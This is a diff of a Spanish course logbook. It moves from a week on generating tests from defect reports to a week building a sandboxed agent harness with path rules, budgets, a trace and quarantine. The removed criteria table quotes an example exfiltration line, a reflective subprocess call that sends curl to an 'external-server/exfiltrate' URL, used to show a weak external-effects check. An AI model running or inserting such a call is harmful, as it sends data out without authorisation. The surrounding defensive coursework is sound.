@@ -1,113 +1,117 @@
-# Bitácora — Semana 3
+# Bitácora — Semana 4 · El portero
 
-## R1 · Encargo elegido
+## Contexto reutilizado de Semana 3
 
-**E-6 — Convertir informes de defecto en casos de prueba ejecutables.**
+Se reutiliza la fábrica definida en `work_order.json` de Semana 3. El nivel declarado continúa siendo **T1**. La actividad de esta semana añade la puerta única de ejecución, el resolutor de rutas, presupuesto previo, tratamiento de error como dato, cuarentena de contenido externo y traza reconstruible.
 
-Se eligió porque el producto final tiene un veredicto binario natural: la prueba es descubierta y ejecutada por el runner, o no.
-Además, permite separar con claridad especificación del defecto, artefacto generado y verificación automática.
+La revisión cruzada se realiza con **Google Gemini como agente externo**, de forma explícita y trazable, igual que en la semana anterior. No se presenta como revisión humana.
 
-## Nivel declarado
+## R1 · Política y saldo
 
-**T1 — Agente acotado.** La ruta puede enumerarse, existe una decisión genuinamente ambigua al traducir un informe de
-defecto a fixture/aserción y la salida puede verificarse por código.
+Saldo inicial: **12 fichas**, equivalentes a 0,05 USD cada una.
 
-Medición que autoriza ascender a T2:
-`intermediate_artifacts_with_independent_reader > 1 OR ledger.retry_cost_usd > ledger.intermediate_gate_cost_usd`.
+Reglas operativas usadas en la corrida digital:
 
-## R2 · Cinco criterios iniciales y autoataque
+- `project:INPUT/**`: lectura permitida, escritura denegada por **I4**.
+- `project:WORK/**`: lectura y escritura permitidas.
+- `project:OUTPUT/**`: escritura solo si el destino no existe; **I5 write-once**.
+- `project:TRACE/**`, `EVIDENCE/**`, `SPEC/**`: lectura y escritura permitidas.
+- `factory:**`: lectura permitida, escritura denegada por **I2** en corrida de proyecto.
+- escape/interproyecto: denegado por **I1/I3**.
+- herramientas permitidas en esta fase: `repo_grep`, `ast_symbols`, `render_md`.
+- cualquier capacidad no registrada: **default-deny**.
+- efectos externos o irreversibles: requieren aprobación humana previa.
+- el presupuesto se cobra antes de conceder; si no alcanza, el resultado es **AGOTADO** con entrega parcial reanudable.
 
-Los cinco criterios se sometieron primero a autoataque. Los que fallaron fueron corregidos antes de la revisión externa.
+La política serializada está en `activity/policy.json`.
 
-| Criterio inicial | Verificación | Sabor | Autoataque | Corrección previa a R3 |
-|---|---|---|---|---|
-| AC-01 · Cada informe produce un test que falla en el estado defectuoso. | `validator:defect_reproduction_rate >= 1.0` | Validador con umbral | `assert False` siempre falla sin reproducir el defecto. | Exigir que la falla provenga de una aserción derivada del comportamiento esperado y no de una falla incondicional. |
-| AC-02 · Cada archivo generado se ejecuta con el runner. | `test:generated_tests_collect_and_run` | Test nombrado | Un archivo vacío puede ser descubierto sin probar nada. | Exigir al menos un caso ejecutable asociado al identificador del informe. |
-| AC-03 · No hay efectos externos. | `test:no_external_effects` | Test nombrado / restricción negativa | Una escritura temporal o llamada de red puede escapar a un control superficial. | Prohibir escrituras fuera del área autorizada y llamadas de red/efectos externos. |
-| AC-04 · La corrida respeta coste y tiempo. | `ledger:cost_usd <= 0.50 AND wall_clock_s <= 300` | Ledger | Detenerse antes de terminar mantiene el presupuesto sin completar el trabajo. | Evaluar presupuesto sólo para corridas marcadas `complete`; una incompleta debe declararse y ser reanudable. |
-| AC-05 · Cada aserción cita el fragmento fuente del informe. | `test:traceability_matches_source` | Test nombrado | Repetir la misma referencia satisface presencia sin trazabilidad real. | Exigir que el localizador exista y coincida con la evidencia usada por la aserción. |
+## R2 · Turno de portero
 
-## R3 · Revisión cruzada con agente externo
+La hoja física se reemplazó por una **traza digital JSONL** en `TRACE/portero.jsonl`. Cada solicitud tiene una línea independiente y puede validarse/reconstruirse automáticamente. La secuencia digital usa S-01…S-15 en orden para que la corrida sea reproducible.
 
-Se ejecutó una revisión adversarial independiente mediante Google Gemini y se conservó la evidencia íntegra.
+El material no asigna V-03 a un ID concreto, solo indica que aparece al pie de un documento de `INPUT`. Para esta corrida reproducible se fijó V-03 en **S-01**; V-02 permanece asociado a S-08 y V-01 a S-12.
 
-- **Run:** `gha-35804447917-1`
-- **Commit evaluado:** `d96fbedc22f124a88ace251d9a4dcb91be92ffab`
-- **Modelo solicitado:** `gemini-3.8-flash`
-- **Modelo efectivo:** `gemini-3.5-flash-lite`
-- **Evidencia:** `audits/runs/gha-35804447917-1/`
-- **Hash de la revisión:** `b825feff4ae473f7b0cf267c892a3a8bf701df8930f2a2f893148275027d92bc`
+| seq | ID | veredicto | motivo | invariante | fichas | saldo | veneno |
+|---:|---|---|---|---|---:|---:|---|
+| 1 | S-01 | permitida | policy_allow | — | 1 | 11 | V-03 |
+| 2 | S-02 | permitida | policy_allow | — | 1 | 10 | — |
+| 3 | S-03 | denegada | entrada_sellada | I4 | 0 | 10 | — |
+| 4 | S-04 | denegada | salida_write_once | I5 | 0 | 10 | — |
+| 5 | S-05 | denegada | intento_de_escape | I1/I3 | 0 | 10 | — |
+| 6 | S-06 | denegada | fabrica_es_solo_lectura | I2 | 0 | 10 | — |
+| 7 | S-07 | denegada | human_approval_required | — | 0 | 10 | — |
+| 8 | S-08 | permitida | tool_allowlist | — | 2 | 8 | V-02 |
+| 9 | S-09 | permitida | budgeted_model_call | — | 4 | 4 | — |
+| 10 | S-10 | agotado | insufficient_budget | — | 0 | 4 | — |
+| 11 | S-11 | denegada | capability_not_allowlisted | — | 0 | 4 | — |
+| 12 | S-12 | permitida | policy_allow | — | 1 | 3 | V-01 |
+| 13 | S-13 | denegada | human_approval_required | — | 0 | 3 | — |
+| 14 | S-14 | permitida | policy_allow | — | 0 | 3 | — |
+| 15 | S-15 | denegada | default_deny_meta_change | — | 0 | 3 | — |
 
-### Tabla 3.A · Defensa de mis criterios
+**Saldo final: 3 fichas.** Se cobraron 9 fichas en S-01, S-02, S-08, S-09 y S-12. S-10 no consume porque el coste de 5 excede el saldo disponible de 4; queda como `agotado`, incompleto y reanudable. Los tres fragmentos V-01, V-02 y V-03 quedan en cuarentena con localizador y la corrida continúa.
 
-| Criterio | Ataque recibido | Salida concreta engañosa | Respuesta | Versión final / decisión |
-|---|---|---|---|---|
-| AC-01 | Falla artificial que aparenta reproducción del defecto. | `def test_defect(): raise AssertionError("Mock expected behavior assertion failure")` | **Aceptado.** La verificación no dejaba explícito que debía ejecutarse la ruta objetivo antes de fallar. | Cada caso debe invocar la ruta objetivo y fallar sólo por una aserción que compare el resultado observado con el comportamiento esperado; `raise AssertionError` y `assert False` no cuentan. Se mantiene `validator:defect_reproduction_rate >= 1.0`. |
-| AC-02 | Test nominal descubierto por el runner pero sin comprobación real. | `def test_DEF_ABST_001(): pass` | **Aceptado.** El ataque cumple descubrimiento e identificación sin verificar el defecto. | Se exige ejecutar la ruta objetivo y evaluar una aserción no trivial derivada del comportamiento esperado. Verificación: `test:generated_tests_collect_and_assert_expected_behavior`. |
-| AC-03 | Efecto externo mediante llamada indirecta/reflexión. | `import subprocess; getattr(subprocess, 'run')(['curl', 'http://external-server/exfiltrate'])` | **Aceptado.** Una búsqueda superficial puede omitir una llamada indirecta. | Se cambia a verificación en ejecución aislada: red deshabilitada, procesos externos bloqueados y escritura restringida. Verificación: `test:no_external_effects_runtime`. |
-| AC-04 | No hubo salida concreta de ataque; el revisor lo marcó `resists`. | — | **Resiste R3.** | Se conserva técnicamente sin cambios, pero luego no se compra en R4 por presupuesto. |
-| AC-05 | El revisor lo marcó `broken` porque fue descartado en la subasta. | No hubo ataque concreto para AC-05. | **Objeción rechazada como ataque R3.** Usa una decisión posterior de R4 y no aporta la salida concreta exigida para un ataque. | Se mantiene la corrección del autoataque; luego se mueve a no-objetivos por la subasta. |
+## R3 · Auditoría cruzada
 
-Los tres ataques válidos recibidos incluyen criterio literal, salida concreta y explicación técnica en
-`audits/runs/gha-35804447917-1/review.json`.
+Gemini actúa como contraparte externa en dos direcciones: produce su propia hoja digital de 15 solicitudes para que yo la audite, y audita mi `TRACE/portero.jsonl` respondiendo las cinco preguntas exigidas. La evidencia se guarda de forma inmutable bajo `audits/runs/<run_id>/`.
 
-### Ataques documentados para C3
+<!-- CROSS_AUDIT_START -->
 
-La revisión externa produjo tres ataques ejecutables y al menos uno fuera del mazo. En esta modalidad se conservan como
-evidencia adversarial dentro de la bitácora y del expediente `audits/`. No se presenta como revisión humana ni como trabajo
-de otro estudiante.
+Pendiente de la corrida automática `external-agent-review-s04`; este bloque se reemplaza por la evidencia estructurada y las cinco respuestas cuando GitHub Actions ejecute Gemini.
 
-## R4 · Subasta de alcance
+<!-- CROSS_AUDIT_END -->
 
-Presupuesto total: **100 fichas**.
+## R4 · Implementación
 
-La revisión de AC-03 mostró que una comprobación de búsqueda simple de 10 fichas no era suficiente. Para cerrar el ataque
-se necesita un **test de repositorio ejecutado en aislamiento**, por lo que AC-03 pasa a costar 25 fichas.
+La implementación queda separada por responsabilidad:
 
-| Criterio | Mecanismo | Coste | Estado |
-|---|---|---:|---|
-| AC-01 | Validador nuevo | 40 | Comprado |
-| AC-02 | Test nuevo de repositorio | 25 | Comprado |
-| AC-03 | Test nuevo de repositorio en aislamiento | 25 | Comprado |
-| AC-04 | Consulta al ledger | 15 | No comprado |
-| AC-05 | Test nuevo de trazabilidad | 25 | No comprado |
+- `harness/paths.py`: resolutor único de rutas; resuelve antes de comparar y devuelve violaciones como datos.
+- `harness/policy.py`: allowlist determinista y default-deny.
+- `harness/budget.py`: reserva previa de pasos, tokens, tiempo y dinero.
+- `harness/taint.py`: detector/aviso y cuarentena de contenido externo.
+- `harness/trace.py`: escritor JSONL, también en fallo, sin secretos ni cadena de pensamiento.
+- `harness/run.py`: puerta única; una ejecución directa sin token de la puerta se deniega y deja traza.
 
-**Total gastado: 90. Restan 10.**
+La batería está dividida en `evals/test_paths.py` (los **6 casos oficiales de rutas**) y `evals/test_arnes.py` (las **6 pruebas oficiales de comportamiento del arnés**).
 
-AC-04 se mueve a no-objetivos:
-“Queda fuera del alcance de esta versión garantizar un tope de USD 0,50 y 300 s por corrida; se reabre cuando el presupuesto
-de verificación disponga de al menos 15 fichas o exista un verificador de ledger mantenido y aceptado para este encargo.”
+Salida literal de `pytest -q`:
 
-AC-05 se mueve a no-objetivos:
-“Queda fuera del alcance de esta versión garantizar trazabilidad exacta entre cada aserción generada y el fragmento fuente
-del informe; se reabre cuando el presupuesto de verificación disponga de al menos 25 fichas para mantener
-`test:traceability_matches_source`.”
+```text
+............                                                             [100%]
+12 passed in 0.05s
+```
 
-El `work_order.json` final contiene únicamente los criterios comprados, tal como exige la ronda de subasta.
+La evidencia versionada está en `evidence/tests.txt`.
 
-## Datos bloqueantes
+### Controles implementados por nivel
 
-Se revisaron las siete clases del apunte. Para una corrida real siguen siendo bloqueantes:
+La fábrica reutilizada es T1: se mantienen I1, I4 e I5 como invariantes del nivel. Los casos I2/I3 también se implementan en el `PathResolver` porque forman parte de la política del laboratorio y de la batería oficial entregada; se documentan como controles conservadores adicionales de esta implementación, no como un cambio silencioso del nivel declarado.
 
-1. el runner/comando autoritativo del repositorio objetivo;
-2. la autoridad de la fuente cuando el informe y el repositorio se contradicen.
+## R5 · Ablación
 
-El detalle y el coste de adivinar mal están en `blocking_questions.md`.
+Pieza retirada: **control I5 de salida write-once** en `PathResolver`.
 
-## R5 · Banco mínimo
+Clase de falla reabierta: una versión ya existente de `OUTPUT` vuelve a ser escribible. En producción esto permitiría sobrescribir un artefacto ya publicado/versionado y romper la propiedad write-once.
 
-Los tres casos obligatorios están en `evals/`:
+La ablación se realiza sobre una copia temporal del repositorio mediante `scripts/run_ablation.py`; el archivo real se conserva intacto. Salida literal:
 
-- `caso_abstencion.jsonl`
-- `caso_adversario.jsonl`
-- `caso_agotamiento.jsonl`
+```text
+=== ABLACIÓN: retirar control I5 salida write-once del PathResolver ===
+...........F                                                             [100%]
+=========================== short test summary info ============================
+FAILED evals/test_paths.py::test_bateria_oficial_de_rutas[project:OUTPUT/v0.1/informe.md-True-salida_write_once] - AssertionError: assert False
+ +  where False = isinstance(PosixPath('/tmp/pytest-of-root/pytest-4/test_bateria_oficial_de_rutas_5/project/OUTPUT/v0.1/informe.md'), Violation)
+1 failed, 11 passed in 0.07s
 
-Cada archivo contiene entrada, estado inicial y veredicto esperado.
+=== RESTAURACIÓN: control I5 presente ===
+............                                                             [100%]
+12 passed in 0.05s
 
-## Estado final
+ABLATION_EVIDENCE_OK removed=I5 failure_class=overwrite_existing_output production=version_overwrite_without_write_once
+```
 
-Quedaron construidos y versionados: R1, R2, autoataque, revisión adversarial externa auditada, respuestas y reescrituras de
-R3, subasta recalculada, R5, nivel, preguntas bloqueantes, schema local, validación local y CI.
+La evidencia completa está en `evidence/ablation.txt`.
 
-La única salvedad metodológica es que la revisión cruzada fue realizada por un **agente externo**. Si el docente exige de
-forma literal otro estudiante humano, esa condición administrativa no puede demostrarse mediante esta automatización.
+## Estado de entrega
+
+La entrega se considera cerrada cuando `audits/latest.json` tenga `status: complete` y el bloque R3 anterior haya sido reemplazado por la corrida de Gemini. `scripts/validate_submission.py` verifica la estructura, la traza de 15 filas, saldos, tres cuarentenas, agotamiento reanudable, 12 pruebas, ablación y auditoría externa.
